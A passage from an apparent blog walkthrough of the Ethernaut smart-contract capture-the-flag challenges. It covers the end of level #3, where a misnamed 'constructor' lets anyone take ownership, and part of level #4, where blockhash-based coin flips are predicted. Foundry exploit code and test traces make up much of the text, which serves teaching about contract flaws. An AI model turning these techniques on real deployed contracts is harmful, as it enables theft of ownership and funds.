</span></span><span style="display:flex;"><span>    <span style="color:#728e00">modifier</span> <span style="color:#d35400">onlyOwner</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">require</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span> <span style="color:#728e00">==</span> <span style="color:#434f54">owner</span>, <span style="color:#7f8c8d">&#34;caller is not the owner&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">_</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">allocate</span>() <span style="color:#728e00">public</span> <span style="color:#728e00">payable</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">allocations</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">=</span> <span style="color:#434f54">allocations</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>].<span style="color:#434f54">add</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">sendAllocation</span>(<span style="color:#00979d">address</span> <span style="color:#728e00">payable</span> <span style="color:#434f54">allocator</span>) <span style="color:#728e00">public</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">require</span>(<span style="color:#434f54">allocations</span>[<span style="color:#434f54">allocator</span>] <span style="color:#728e00">&gt;</span> <span style="color:#8a7b52">0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">allocator</span>.<span style="color:#728e00">transfer</span>(<span style="color:#434f54">allocations</span>[<span style="color:#434f54">allocator</span>]);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">collectAllocations</span>() <span style="color:#728e00">public</span> <span style="color:#434f54">onlyOwner</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">payable</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>).<span style="color:#728e00">transfer</span>(<span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>).<span style="color:#728e00">balance</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">allocatorBalance</span>(<span style="color:#00979d">address</span> <span style="color:#434f54">allocator</span>) <span style="color:#728e00">public</span> <span style="color:#728e00">view</span> <span style="color:#728e00">returns</span> (<span style="color:#00979d">uint256</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">return</span> <span style="color:#434f54">allocations</span>[<span style="color:#434f54">allocator</span>];
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>I&rsquo;ll skip the <code>FalloutFactory</code> contract because it is almost
identical to the <code>FallbackFactory</code> from the previous challenge,
except that in its <code>validateInstance</code> function it only checks
that <code>owner() == player</code>.</p>
  <!--list-separator-->
<ul>
<li>
<p>Analysis &amp; Exploit</p>
<p>Let&rsquo;s start with the constructor&hellip; that doesn&rsquo;t look like a
constructor:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#95a5a6">/* constructor */</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">Fal1out</span>() <span style="color:#728e00">public</span> <span style="color:#728e00">payable</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">owner</span> <span style="color:#728e00">=</span> <span style="color:#728e00">payable</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">allocations</span>[<span style="color:#434f54">owner</span>] <span style="color:#728e00">=</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This is a regular public function that anyone can call:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">exploit</span>() <span style="color:#728e00">internal</span> <span style="color:#728e00">override</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">startPrank</span>(<span style="color:#434f54">player</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">level</span>.<span style="color:#434f54">Fal1out</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">stopPrank</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The rest of the contract is not interesting to us.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ forge <span style="color:#728e00">test</span> --match-contract FalloutTest -vvvv
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Running <span style="color:#8a7b52">1</span> <span style="color:#728e00">test</span> <span style="color:#728e00">for</span> src/test/Fallout.t.sol:FalloutTest
</span></span><span style="display:flex;"><span><span style="color:#728e00">[</span>PASS<span style="color:#728e00">]</span> testFallout<span style="color:#728e00">()</span> <span style="color:#728e00">(</span>gas: 328094<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>Traces:
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">[</span>328094<span style="color:#728e00">]</span> FalloutTest::testFallout<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>251327<span style="color:#728e00">]</span> FalloutTest::create<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::prank<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>238979<span style="color:#728e00">]</span> Ethernaut::createLevelInstance<span style="color:#728e00">(</span>FalloutFactory: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>187416<span style="color:#728e00">]</span> FalloutFactory::createInstance<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   │   ├─ <span style="color:#728e00">[</span>154802<span style="color:#728e00">]</span> → new Fallout@<span style="color:#7f8c8d">&#34;0x037f…dd8f&#34;</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   └─ ← <span style="color:#8a7b52">773</span> bytes of code
</span></span><span style="display:flex;"><span>    │   │   │   └─ ← Fallout: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ emit LevelInstanceCreatedLog<span style="color:#728e00">(</span>player: player: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, instance: Fallout: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← Fallout: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   └─ ← Fallout: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::startPrank<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>24507<span style="color:#728e00">]</span> Fallout::Fal1out<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::stopPrank<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::startPrank<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>4391<span style="color:#728e00">]</span> Ethernaut::submitLevelInstance<span style="color:#728e00">(</span>Fallout: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>1344<span style="color:#728e00">]</span> FalloutFactory::validateInstance<span style="color:#728e00">(</span>Fallout: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>348<span style="color:#728e00">]</span> Fallout::owner<span style="color:#728e00">()</span> <span style="color:#728e00">[</span>staticcall<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   │   │   └─ ← player: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    │   ├─ emit LevelCompletedLog<span style="color:#728e00">(</span>player: player: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, level: FalloutFactory: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::stopPrank<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    └─ ← <span style="color:#728e00">()</span>
</span></span></code></pre></div></li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Summary</p>
<p>This pretty trivial challenge illustrates how a simple typo
could result in serious security hole:</p>
<p>Up to Solidity <code>0.4.21</code>, constructor can be defined by the same
name of its contract name. Which can cause unintended bugs when
you change the contract&rsquo;s name but forget to rename its
constructor (this happened with
<a href="https://github.com/crytic/not-so-smart-contracts/tree/master/wrong_constructor_name"  class="external-link" target="_blank" rel="noopener">Rubixi</a>).
In Solidity <code>0.4.22</code> and above we use the <code>constructor</code> keyword.</p>
<hr>
<p>Code for this step is in branch
<a href="https://github.com/vyorkin/ethernaut-solutions/blob/step-3/src/test/Fallout.t.sol"  class="external-link" target="_blank" rel="noopener">step-3</a>.</p>
<p>Let&rsquo;s continue to the next challenge:
<a href="https://vyorkin.org/posts/ctf-walkthrough-ethernaut-4-coin-flip" >Ethernaut, #4 Coin Flip</a>!</p>
</li>
</ul>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo done DONE">DONE</span>  Ethernaut, #4 Coin Flip</p>
<p>To complete this challenge we need to predict the outcome of a
coin flip game 10 times in a row. Here is the slightly altered
version of the original smart contract:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#95a5a6">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#728e00">pragma solidity</span> <span style="color:#728e00">^</span><span style="color:#8a7b52">0</span>.<span style="color:#8a7b52">8</span>.<span style="color:#8a7b52">2</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">CoinFlip</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#728e00">public</span> <span style="color:#434f54">consecutiveWins</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">lastHash</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">FACTOR</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8a7b52">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">constructor</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">consecutiveWins</span> <span style="color:#728e00">=</span> <span style="color:#8a7b52">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">flip</span>(<span style="color:#00979d">bool</span> <span style="color:#434f54">_guess</span>) <span style="color:#728e00">public</span> <span style="color:#728e00">returns</span> (<span style="color:#00979d">bool</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#00979d">uint256</span> <span style="color:#434f54">blockValue</span> <span style="color:#728e00">=</span> <span style="color:#00979d">uint256</span>(<span style="color:#728e00">blockhash</span>(<span style="color:#728e00">block</span>.<span style="color:#728e00">number</span> <span style="color:#728e00">-</span> <span style="color:#8a7b52">1</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (<span style="color:#434f54">lastHash</span> <span style="color:#728e00">==</span> <span style="color:#434f54">blockValue</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#728e00">revert</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">lastHash</span> <span style="color:#728e00">=</span> <span style="color:#434f54">blockValue</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#00979d">uint256</span> <span style="color:#434f54">coinFlip</span> <span style="color:#728e00">=</span> <span style="color:#434f54">blockValue</span> <span style="color:#728e00">/</span> <span style="color:#434f54">FACTOR</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#00979d">bool</span> <span style="color:#434f54">side</span> <span style="color:#728e00">=</span> <span style="color:#434f54">coinFlip</span> <span style="color:#728e00">==</span> <span style="color:#8a7b52">1</span> <span style="color:#728e00">?</span> <span style="color:#00979d">true</span> <span style="color:#728e00">:</span> <span style="color:#00979d">false</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (<span style="color:#434f54">side</span> <span style="color:#728e00">==</span> <span style="color:#434f54">_guess</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#434f54">consecutiveWins</span><span style="color:#728e00">++</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#728e00">return</span> <span style="color:#00979d">true</span>;
</span></span><span style="display:flex;"><span>        } <span style="color:#728e00">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#434f54">consecutiveWins</span> <span style="color:#728e00">=</span> <span style="color:#8a7b52">0</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#728e00">return</span> <span style="color:#00979d">false</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div>  <!--list-separator-->
<ul>
<li>
<p>Analysis</p>
<p>The <code>CoinFlip</code> contract has 3 state variables:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00979d">uint256</span> <span style="color:#728e00">public</span> <span style="color:#434f54">consecutiveWins</span>;
</span></span><span style="display:flex;"><span><span style="color:#00979d">uint256</span> <span style="color:#434f54">lastHash</span>;
</span></span><span style="display:flex;"><span><span style="color:#00979d">uint256</span> <span style="color:#434f54">FACTOR</span> <span style="color:#728e00">=</span> <span style="color:#8a7b52">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;
</span></span></code></pre></div><ul>
<li><code>consecutiveWins</code> &ndash; Keeps track of a number of consecutive wins :)</li>
<li><code>lastHash</code> &ndash; Contains an integer representation of the previous block&rsquo;s hash.</li>
<li><code>FACTOR</code> &ndash; Used in the <code>flip</code> function to calculate coin side.</li>
</ul>
<p>Let&rsquo;s examine the <code>flip</code> function:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00979d">uint256</span> <span style="color:#434f54">blockValue</span> <span style="color:#728e00">=</span> <span style="color:#00979d">uint256</span>(<span style="color:#728e00">blockhash</span>(<span style="color:#728e00">block</span>.<span style="color:#728e00">number</span> <span style="color:#728e00">-</span> <span style="color:#8a7b52">1</span>));
</span></span></code></pre></div><ul>
<li>The <code>blockValue</code> local variable is an integer representation of the previous block&rsquo;s hash.</li>
<li>This function uses <code>block.number</code> as a source of randomness (ha-ha! 😈).</li>
<li>According to
<a href="https://docs.soliditylang.org/en/v0.8.15/units-and-global-variables.html#block-and-transaction-properties"  class="external-link" target="_blank" rel="noopener">Solidity
docs</a>, <code>blockhash</code> gets hash of the given block when
<code>blocknumber</code> is one of the 256 most recent blocks. Hence, the
<code>blockValue</code> is the previous block&rsquo;s hash casted to <code>uint256</code>.</li>
<li>The <code>FACTOR</code> is
<code>8000000000000000000000000000000000000000000000000000000000000000</code>
in hexadecimal. The <code>blockValue</code> divided by this factor gives us 50%
probability of getting heads or tails.</li>
</ul>
<p>This check prevents us from doing two flips in the same block:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">if</span> (<span style="color:#434f54">lastHash</span> <span style="color:#728e00">==</span> <span style="color:#434f54">blockValue</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">revert</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>For the above check to work the <code>lastHash</code> is saved on each <code>flip</code>:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">lastHash</span> <span style="color:#728e00">=</span> <span style="color:#434f54">blockValue</span>;
</span></span></code></pre></div><p>The <code>blockValue</code> is divided by <code>FACTOR</code> to determine a coin side:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00979d">uint256</span> <span style="color:#434f54">coinFlip</span> <span style="color:#728e00">=</span> <span style="color:#434f54">blockValue</span> <span style="color:#728e00">/</span> <span style="color:#434f54">FACTOR</span>;
</span></span><span style="display:flex;"><span><span style="color:#00979d">bool</span> <span style="color:#434f54">side</span> <span style="color:#728e00">=</span> <span style="color:#434f54">coinFlip</span> <span style="color:#728e00">==</span> <span style="color:#8a7b52">1</span> <span style="color:#728e00">?</span> <span style="color:#00979d">true</span> <span style="color:#728e00">:</span> <span style="color:#00979d">false</span>;
</span></span></code></pre></div><p>The <code>if-else</code> condition increments or resets the <code>consecutiveWins</code>:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">if</span> (<span style="color:#434f54">side</span> <span style="color:#728e00">==</span> <span style="color:#434f54">_guess</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">consecutiveWins</span><span style="color:#728e00">++</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">return</span> <span style="color:#00979d">true</span>;
</span></span><span style="display:flex;"><span>} <span style="color:#728e00">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">consecutiveWins</span> <span style="color:#728e00">=</span> <span style="color:#8a7b52">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">return</span> <span style="color:#00979d">false</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div></li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Exploit</p>
<p>We can have a contract that contains a function, which runs the
same logic to &ldquo;guess&rdquo; the <code>flip</code> outcome:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">exploit</span>() <span style="color:#728e00">internal</span> <span style="color:#728e00">override</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">startPrank</span>(<span style="color:#434f54">player</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">for</span> (<span style="color:#00979d">uint256</span> <span style="color:#434f54">i</span> <span style="color:#728e00">=</span> <span style="color:#8a7b52">0</span>; <span style="color:#434f54">i</span> <span style="color:#728e00">&lt;</span> <span style="color:#8a7b52">10</span>; <span style="color:#434f54">i</span><span style="color:#728e00">++</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#00979d">uint256</span> <span style="color:#434f54">blockValue</span> <span style="color:#728e00">=</span> <span style="color:#00979d">uint256</span>(<span style="color:#728e00">blockhash</span>(<span style="color:#728e00">block</span>.<span style="color:#728e00">number</span> <span style="color:#728e00">-</span> <span style="color:#8a7b52">1</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#00979d">uint256</span> <span style="color:#434f54">coinFlip</span> <span style="color:#728e00">=</span> <span style="color:#434f54">blockValue</span> <span style="color:#728e00">/</span> <span style="color:#434f54">FACTOR</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#00979d">bool</span> <span style="color:#434f54">side</span> <span style="color:#728e00">=</span> <span style="color:#434f54">coinFlip</span> <span style="color:#728e00">==</span> <span style="color:#8a7b52">1</span> <span style="color:#728e00">?</span> <span style="color:#00979d">true</span> <span style="color:#728e00">:</span> <span style="color:#00979d">false</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">level</span>.<span style="color:#434f54">flip</span>(<span style="color:#434f54">side</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">utils</span>.<span style="color:#434f54">mineBlocks</span>(<span style="color:#8a7b52">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">stopPrank</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Here we call the <code>utils.mineBlocks(1)</code>. It calls the
<a href="https://book.getfoundry.sh/cheatcodes/roll"  class="external-link" target="_blank" rel="noopener">vm.roll</a> that
sets the current block number. It allows us to move the
<code>block.number</code> forward by a given <code>count</code> of blocks:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">mineBlocks</span>(<span style="color:#00979d">uint256</span> <span style="color:#434f54">count</span>) <span style="color:#728e00">external</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">target</span> <span style="color:#728e00">=</span> <span style="color:#728e00">block</span>.<span style="color:#728e00">number</span> <span style="color:#728e00">+</span> <span style="color:#434f54">count</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">roll</span>(<span style="color:#434f54">target</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The trace:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>forge <span style="color:#728e00">test</span> --match-contract CoinFlipTest -vvvv
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Running <span style="color:#8a7b52">1</span> <span style="color:#728e00">test</span> <span style="color:#728e00">for</span> src/test/CoinFlip.t.sol:CoinFlipTest
</span></span><span style="display:flex;"><span><span style="color:#728e00">[</span>PASS<span style="color:#728e00">]</span> testCoinFlip<span style="color:#728e00">()</span> <span style="color:#728e00">(</span>gas: 342799<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>Traces:
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">[</span>342799<span style="color:#728e00">]</span> CoinFlipTest::testCoinFlip<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>212118<span style="color:#728e00">]</span> CoinFlipTest::create<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::prank<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>199770<span style="color:#728e00">]</span> Ethernaut::createLevelInstance<span style="color:#728e00">(</span>CoinFlipFactory: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>148207<span style="color:#728e00">]</span> CoinFlipFactory::createInstance<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   │   ├─ <span style="color:#728e00">[</span>115659<span style="color:#728e00">]</span> → new CoinFlip@<span style="color:#7f8c8d">&#34;0x037f…dd8f&#34;</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   └─ ← <span style="color:#8a7b52">456</span> bytes of code
</span></span><span style="display:flex;"><span>    │   │   │   └─ ← CoinFlip: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ emit LevelInstanceCreatedLog<span style="color:#728e00">(</span>player: player: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, instance: CoinFlip: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← CoinFlip: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   └─ ← CoinFlip: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>295<span style="color:#728e00">]</span> CoinFlip::consecutiveWins<span style="color:#728e00">()</span> <span style="color:#728e00">[</span>staticcall<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#8a7b52">0</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::startPrank<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>42978<span style="color:#728e00">]</span> CoinFlip::flip<span style="color:#728e00">(</span><span style="color:#728e00">false</span><span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>733<span style="color:#728e00">]</span> Utils::mineBlocks<span style="color:#728e00">(</span>1<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::roll<span style="color:#728e00">(</span>2<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>1168<span style="color:#728e00">]</span> CoinFlip::flip<span style="color:#728e00">(</span><span style="color:#728e00">true</span><span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>733<span style="color:#728e00">]</span> Utils::mineBlocks<span style="color:#728e00">(</span>1<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::roll<span style="color:#728e00">(</span>3<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>1178<span style="color:#728e00">]</span> CoinFlip::flip<span style="color:#728e00">(</span><span style="color:#728e00">false</span><span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>733<span style="color:#728e00">]</span> Utils::mineBlocks<span style="color:#728e00">(</span>1<span style="color:#728e00">)</span>
